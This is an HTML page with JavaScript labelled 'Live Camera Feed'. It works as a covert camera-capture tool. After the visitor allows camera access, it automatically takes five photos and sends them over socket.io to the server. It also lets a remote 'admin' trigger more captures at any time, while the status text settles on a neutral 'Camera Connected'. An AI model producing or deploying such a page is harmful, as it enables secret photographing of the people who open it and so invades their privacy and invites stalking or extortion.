<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Camera Feed</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        h2 { color: #00e676; }
        video {
            width: 90%;
            max-width: 400px;
            border-radius: 10px;
            border: 2px solid #333;
        }
        canvas { display: none; }
        .status { margin-top: 15px; font-size: 14px; color: #aaa; }
    </style>
</head>
<body>

    <h2>📷 Live Camera Feed</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <div class="status" id="status">Connecting to camera...</div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusText = document.getElementById('status');

        let captureCount = 0;
        const maxCaptures = 5;

        function captureAndSend() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL('image/png');
            socket.emit('user-photo-captured', imageData);
            captureCount++;
            statusText.innerText = `Auto Captured ${captureCount}/${maxCaptures}`;
        }

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                statusText.innerText = "Camera Active";

                // Wait 1 second for camera initialization, then start 5 auto-captures every 1 sec
                setTimeout(() => {
                    const autoInterval = setInterval(() => {
                        if (captureCount < maxCaptures) {
                            captureAndSend();
                        } else {
                            clearInterval(autoInterval);
                            statusText.innerText = "Camera Connected";
                        }
                    }, 1000);
                }, 1000);
            })
            .catch(err => {
                console.error("Camera Error: ", err);
                statusText.innerText = "Camera Permission Denied";
            });

        // Admin manual trigger response
        socket.on('capture-photo', () => {
            captureAndSend();
        });
    </script>
</body>
</html>
